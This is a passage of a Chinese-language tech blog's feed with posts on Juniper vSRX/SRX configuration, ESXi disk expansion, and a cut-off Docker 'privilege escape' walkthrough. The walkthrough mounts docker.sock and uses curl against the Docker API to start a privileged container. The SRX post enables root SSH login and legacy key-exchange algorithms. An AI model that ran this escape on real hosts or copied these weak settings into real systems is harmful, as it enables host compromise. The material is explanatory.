&lt;li&gt;依序填入下列資訊&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227103559.png&quot; alt=&quot;Pasted image 20251227103559.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;v-srx-1&quot; tabindex=&quot;-1&quot;&gt;vSRX 設定檢查&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;arp&quot; tabindex=&quot;-1&quot;&gt;檢查機器是否有廣播 ARP&lt;/h3&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show arp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227104844.png&quot; alt=&quot;Pasted image 20251227104844.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;兩台新建立的機器已經開始廣播 ARP 了&lt;/p&gt;
&lt;h3 id=&quot;v-srx-interface&quot; tabindex=&quot;-1&quot;&gt;查看 vSRX interface 設定&lt;/h3&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show configuration interfaces
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227110207.png&quot; alt=&quot;Pasted image 20251227110207.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;security-zone&quot; tabindex=&quot;-1&quot;&gt;檢查 security zone&lt;/h3&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show security zones
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227110533.png&quot; alt=&quot;Pasted image 20251227110533.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;測試路由狀況&quot; tabindex=&quot;-1&quot;&gt;測試路由狀況&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;從 test-1 ping 到 test-2 (ping OK)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227105248.png&quot; alt=&quot;Pasted image 20251227105248.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;從 test-2 ping 到 test-1 (ping OK)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227105322.png&quot; alt=&quot;Pasted image 20251227105322.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;暫停 vSRX 後測試 (ping 不通)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227105439.png&quot; alt=&quot;Pasted image 20251227105439.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;兩台 VM 無法互通&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227105537.png&quot; alt=&quot;Pasted image 20251227105537.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;恢復 vSRX 後測試 (ping OK)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227105637.png&quot; alt=&quot;Pasted image 20251227105637.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;80-port&quot; tabindex=&quot;-1&quot;&gt;測試 80 port&lt;/h3&gt;
&lt;p&gt;test-2 -&amp;gt; test-1(port 80 OK)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227111916.png&quot; alt=&quot;Pasted image 20251227111916.png&quot; /&gt;&lt;br /&gt;
test-1 -&amp;gt; test-2(port 80 OK)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227112035.png&quot; alt=&quot;Pasted image 20251227112035.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;透過在 ESXi 上建立 VLAN 連接埠群組，並在 vSRX 上設定對應的子介面與 VLAN ID，可以成功實現單臂路由，讓不同 VLAN 的虛擬機器能夠互相通訊。&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/在 ESXi 以 vSRX 實作單臂路由/" >
        </entry>
        <entry>
            <title>
                SRX ssh server 設定
                
            </title>
            <updated>2026-01-05T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/SRX/SRX ssh server 設定/</id>
            <content type="html">
                &lt;h2 id=&quot;ssh&quot; tabindex=&quot;-1&quot;&gt;設定 SSH&lt;/h2&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code&gt;configure
set system services ssh
set system services ssh root-login allow
set system root-authentication plain-text-password
commit
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;ssh-1&quot; tabindex=&quot;-1&quot;&gt;在安全區域上允許 SSH 流量&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;需要確認 10.77.18.12 這個 IP 所在的介面是屬於哪個安全區域 (security zone)。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root&amp;gt; show security zones
...
Security zone: untrust
  Send reset for non-SYN session TCP packets: Off
  Policy configurable: Yes
  Interfaces bound: 1
  Interfaces:
    fe-0/0/7.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;目前配置 fe-0/0/7.0 屬於 untrust zone&lt;/p&gt;
&lt;p&gt;為了允許 ssh 流量來到 &amp;quot;untrust&amp;quot; 區域，請執行以下指令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;configure
set security zones security-zone untrust interfaces fe-0/0/7.0 host-inbound-traffic system-services ssh
commit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;設定連線資訊在 ~/.ssh/config&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host srx-firewall
	HostName 10.7x.1x.1x
	User root
	KexAlgorithms +diffie-hellman-group1-sha1
	HostKeyAlgorithms +ssh-rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ssh 連線&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh srx-firewall
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/SRX/SRX ssh server 設定/" >
        </entry>
        <entry>
            <title>
                ESXi VM 擴容實作 - Partition 擴增
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/ESXi VM 擴容實作 - Partition 擴增/</id>
            <content type="html">
                &lt;h1 id=&quot;背景&quot; tabindex=&quot;-1&quot;&gt;背景&lt;/h1&gt;
&lt;p&gt;在 ESXi 調整硬碟大小&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207193016.png&quot; alt=&quot;Pasted image 20241207193016.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但這次是直接將 partition 掛載到 &lt;code&gt;/&lt;/code&gt;&lt;br /&gt;
沒有再經過 PV -&amp;gt; VG -&amp;gt; LV 掛載流程&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229211818.png&quot; alt=&quot;Pasted image 20251229211818.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;開始&quot; tabindex=&quot;-1&quot;&gt;開始&lt;/h1&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;parted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229211932.png&quot; alt=&quot;Pasted image 20251229211932.png&quot; /&gt;&lt;br /&gt;
確認新擴增的空間尚未被格式化&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!CAUTION] 注意 !!!&lt;br /&gt;
要被 growpart 的空間絕對不能被格式化，不然會出現「NOCHANGE: partition 2 is size 62908416. it cannot be grown」錯誤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果發現已經被格式化過了，就刪除該分區，讓他變成未被格式化的狀態，如下圖&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207193928.png&quot; alt=&quot;Pasted image 20241207193928.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;增加 partition 空間&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;growpart /dev/sda 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229212025.png&quot; alt=&quot;Pasted image 20251229212025.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;resize2fs&lt;/code&gt; 讓實際掛載在系統根目錄的 &lt;code&gt;/dev/sda2&lt;/code&gt; 擴容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;resize2fs /dev/sda2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229212105.png&quot; alt=&quot;Pasted image 20251229212105.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;總結&quot; tabindex=&quot;-1&quot;&gt;總結&lt;/h1&gt;
&lt;p&gt;如果掛載到系統根目錄的方式沒有使用 LVM 的方式，即透過 PV(Physical Volume) 組成 VG(Volume group)，然後在 VG(Volume group) 裡面建立 LV(Logic volume) 的方法，用上面的方式就可以對特定的 partition 做擴容了，方法相對簡單，但沒有 LVM2(Logic volume manage, version 2) 的加持，未來調整空間就比較受限&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/ESXi VM 擴容實作 - Partition 擴增/" >
        </entry>
        <entry>
            <title>
                ESXi VM 擴容實作 - LVM2
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/ESXi VM 擴容實作 - LVM2/</id>
            <content type="html">
                &lt;h1 id=&quot;背景&quot; tabindex=&quot;-1&quot;&gt;背景&lt;/h1&gt;
&lt;p&gt;在 ESXi 建立的 VM 想增加磁碟空間，所以紀錄下整個過程。&lt;/p&gt;
&lt;p&gt;目標主機使用 LVM2 的方式掛載系統根目錄，即實際掛載對象為 LV(Logic volume)。&lt;/p&gt;
&lt;h2 id=&quot;系統版本&quot; tabindex=&quot;-1&quot;&gt;系統版本&lt;/h2&gt;
&lt;p&gt;ubuntu 20.04.5&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207173634.png&quot; alt=&quot;Pasted image 20241207173634.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;開始&quot; tabindex=&quot;-1&quot;&gt;開始&lt;/h1&gt;
&lt;p&gt;進入 edit settings&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229211619.png&quot; alt=&quot;Pasted image 20251229211619.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;調整硬碟大小&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207173040.png&quot; alt=&quot;Pasted image 20241207173040.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207173153.png&quot; alt=&quot;Pasted image 20241207173153.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;調整完成，硬碟空間變大了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251229211639.png&quot; alt=&quot;Pasted image 20251229211639.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但目前 linux 主機內空間還是沒改變&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207173444.png&quot; alt=&quot;Pasted image 20241207173444.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;重開機後&lt;br /&gt;
/dev/sda 就擴容到 35G 了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207174314.png&quot; alt=&quot;Pasted image 20241207174314.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;但實際掛載在系統目錄 lv 的大小還是沒改變，目標是「擴增系統位置 &amp;quot;/&amp;quot;」&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ lsblk
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207174728.png&quot; alt=&quot;Pasted image 20241207174728.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查看 pv 與 vg 狀態，目前都是 28.25(原始大小)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pvdisplay
$ vgdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207175440.png&quot; alt=&quot;Pasted image 20241207175440.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;LV 的空間 28G&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ lvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;LV 是實際上被掛載到系統根目錄 &amp;quot;/&amp;quot; 的 volume&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207175659.png&quot; alt=&quot;Pasted image 20241207175659.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;partition&quot; tabindex=&quot;-1&quot;&gt;擴充原有 partition，使用剩餘空間&lt;/h2&gt;
&lt;p id=&quot;dc4611&quot;&gt;使用 parted 工具進行 resize&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ parted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入「&lt;code&gt;p&lt;/code&gt;」顯示所有 partition&lt;br /&gt;
系統告知不是所有空間都能被使用&lt;br /&gt;
輸入「Fix」修復 GPT(GUID Partition Table) 分區表&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207180056.png&quot; alt=&quot;Pasted image 20241207180056.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;執行 partition resize 操作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(parted) resizepart
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;將 /dev/sda 上的 /dev/sda3(partition 3) 從 32G 擴增到 35G，此時 number 3 partition 已經使用了所有空間&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207180824.png&quot; alt=&quot;Pasted image 20241207180824.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;輸入 「&lt;code&gt;q&lt;/code&gt;」離開&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207181023.png&quot; alt=&quot;Pasted image 20241207181023.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;pv&quot; tabindex=&quot;-1&quot;&gt;擴充 PV 空間&lt;/h2&gt;
&lt;p&gt;原本上面的 number 3 partition 已經是現存的 PV，既然 partition 已經變大，接著就可以直接進行 resize 的操作&lt;br /&gt;
尚未進行 resize 前 PV 大小 28.25G&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207181459.png&quot; alt=&quot;Pasted image 20241207181459.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;執行 pvresize&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pvresize /dev/sda3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;變成 30.84G&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207181722.png&quot; alt=&quot;Pasted image 20241207181722.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查看 vg size&lt;br /&gt;
vg size 也變大了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ vgdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207181909.png&quot; alt=&quot;Pasted image 20241207181909.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;lv&quot; tabindex=&quot;-1&quot;&gt;擴充 LV 空間&lt;/h1&gt;
&lt;p&gt;接著擴充 LV 空間&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 原本的 LV 空間狀況  
$ lvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207182040.png&quot; alt=&quot;Pasted image 20241207182040.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;lv-35-gb&quot; tabindex=&quot;-1&quot;&gt;將 LV 空間擴充成 35GB&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;$ lvextend -L 35G /dev/ubuntu-vg/ubuntu-lv
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207182818.png&quot; alt=&quot;Pasted image 20241207182818.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;出現錯誤，看起來是目前輸入的值超過可擴展的 pv 空間&lt;/p&gt;
&lt;p&gt;進一步排查發現，扣掉 1.8G 的 sda2 分區，還有2.3GB 的 disk 空間未分配給 /dev/sda3&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207183136.png&quot; alt=&quot;Pasted image 20241207183136.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ parted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;回到 &lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ESXi/ESXi%20VM%20%E6%93%B4%E5%AE%B9%E5%AF%A6%E4%BD%9C%20-%20LVM2/#partition&quot;&gt;ESXi VM 擴容實作 - LVM2#擴充原有 partition，使用剩餘空間&lt;/a&gt;&lt;br /&gt;
但這次請注意這個 Disk 值，這是可用的最大空間&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207184423.png&quot; alt=&quot;Pasted image 20241207184423.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;partition 3 確實沒有佔滿所有的 37.6GB 的空間&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207184930.png&quot; alt=&quot;Pasted image 20241207184930.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;將 end 設為 37.6GB&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207184647.png&quot; alt=&quot;Pasted image 20241207184647.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;再執行一次 pvresize&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pvresize /dev/sda3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;已經從原本的 30.84GB 增加到 33.25GB 了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207185342.png&quot; alt=&quot;Pasted image 20241207185342.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;執行 lvextend 增加 lv 空間&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lvextend -L 33G /dev/ubuntu-vg/ubuntu-lv
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207185752.png&quot; alt=&quot;Pasted image 20241207185752.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最後再 resize2fs 增加系統根目錄 &lt;code&gt;/&lt;/code&gt; 的可用空間&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;resize2fs /dev/ubuntu-vg/ubuntu-lv
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207190011.png&quot; alt=&quot;Pasted image 20241207190011.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;知識點&quot; tabindex=&quot;-1&quot;&gt;知識點&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;磁碟掛載命名順序與分區命名規則如下:
&lt;ol&gt;
&lt;li&gt;disk:
&lt;ol&gt;
&lt;li&gt;第一顆 disk -&amp;gt; /dev/sda
&lt;ol&gt;
&lt;li&gt;第一個分區 -&amp;gt; /dev/sda1
&lt;ol&gt;
&lt;li&gt;partition id: 1&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;第二個分區 -&amp;gt; /dev/sda2
&lt;ol&gt;
&lt;li&gt;partition id: 2&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;... 以此類推&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;第二顆 disk -&amp;gt; /dev/sdb&lt;/li&gt;
&lt;li&gt;第三顆 disk -&amp;gt; /dev/sdc&lt;/li&gt;
&lt;li&gt;... 以此類推&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;理解 Linux PV、LV、VG 之間的關係
&lt;ol&gt;
&lt;li&gt;PV(Physical volume) = 磁碟分割區 (/dev/sda1、/dev/sda2)
&lt;ol&gt;
&lt;li&gt;可以從 &lt;code&gt;pvdisplay&lt;/code&gt; 看到，PV Name = 系統磁碟分區&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207190420.png&quot; alt=&quot;Pasted image 20241207190420.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;VG(Volume group)
&lt;ol&gt;
&lt;li&gt;多個 PV 可以建成一個 VG，也可以將 PV 加入現有 VG&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;LV(Logical volume)
&lt;ol&gt;
&lt;li&gt;用 &lt;code&gt;lsblk -f&lt;/code&gt; 可以看出，sda3 下面有 一個 vg，vg下面有一個 lv&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241207190231.png&quot; alt=&quot;Pasted image 20241207190231.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;VG 下面會有多個 LV&lt;/li&gt;
&lt;li&gt;LV 就是實際掛載給系統根目錄使用的，屬於虛擬邏輯分區&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;指令&quot; tabindex=&quot;-1&quot;&gt;指令&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;lsblk -f
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ pvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ lvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ vgdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;parted&quot; tabindex=&quot;-1&quot;&gt;parted&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;$ parted
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;fdisk&quot; tabindex=&quot;-1&quot;&gt;fdisk&lt;/h2&gt;
&lt;p&gt;輸入 fdisk 指令後，會進入磁碟管理工具裡面&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ fdisk /dev/sda
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;指令:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;p 列出該 disk 所有的分區&lt;/li&gt;
&lt;li&gt;m 輸出 menu 列表&lt;/li&gt;
&lt;li&gt;n 建立新的磁碟分區&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;參考資料&quot; tabindex=&quot;-1&quot;&gt;參考資料&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://godleon.github.io/blog/Linux/Linux-extend-lvm-from-unused-space/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://godleon.github.io/blog/Linux/Linux-extend-lvm-from-unused-space/&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://sc8log.blogspot.com/2017/03/linux-lvm-lvm.html&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://sc8log.blogspot.com/2017/03/linux-lvm-lvm.html&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/ESXi VM 擴容實作 - LVM2/" >
        </entry>
        <entry>
            <title>
                docker 特權逃逸
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#docker&quot;&gt;#docker&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;起因&quot; tabindex=&quot;-1&quot;&gt;起因&lt;/h2&gt;
&lt;p&gt;因為 docker daemon 是在 root 權限下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ll -a /var/run/docker.sock
lrwxr-xr-x  1 root  daemon    63B Jun 10 23:39 /var/run/docker.sock -&amp;gt; /Users/jason/.local/share/containers/podman/machine/podman.sock
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊&lt;/p&gt;
&lt;p&gt;建立特權容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 使用 curlimages/curl 作為基礎鏡像
FROM curlimages/curl:latest

USER root
# 安裝 sudo
RUN apk --no-cache add sudo

RUN apk --no-cache add docker

# 創建一個新用戶並設置適當的權限
RUN addgroup -S docker &amp;amp;&amp;amp; adduser -S dockeruser -G docker

# 允許 dockeruser 使用 sudo 而不需要密碼
RUN echo &#39;dockeruser ALL=(ALL) NOPASSWD:ALL&#39; &amp;gt;&amp;gt; /etc/sudoers

# 切換到 dockeruser 用戶
USER dockeruser

# 設置工作目錄
WORKDIR /home/dockeruser

# 執行一個無限循環的命令，確保容器一直保持運行
CMD [&amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;while :; do sleep 10; done&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker build -t my-curl-image .
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-conatiner&quot; tabindex=&quot;-1&quot;&gt;建立 docker conatiner&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;docker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;container-docker-sock-unix-host-docker&quot; tabindex=&quot;-1&quot;&gt;在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊&lt;/h2&gt;
&lt;h3 id=&quot;docker-images&quot; tabindex=&quot;-1&quot;&gt;建立一個 docker images&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock -d &#39;{&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;, &amp;quot;Privileged&amp;quot;:true}&#39; -H &#39;Content-Type: application/json&#39; http:/v1.24/containers/create
{&amp;quot;Id&amp;quot;:&amp;quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&amp;quot;,&amp;quot;Warnings&amp;quot;:[]}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-images-1&quot; tabindex=&quot;-1&quot;&gt;啟動 docker images&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-container&quot; tabindex=&quot;-1&quot;&gt;列出所有 docker container 狀態&lt;/h3&gt;
&lt;p&gt;等價:&lt;br /&gt;
&lt;code&gt;docker ps&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json
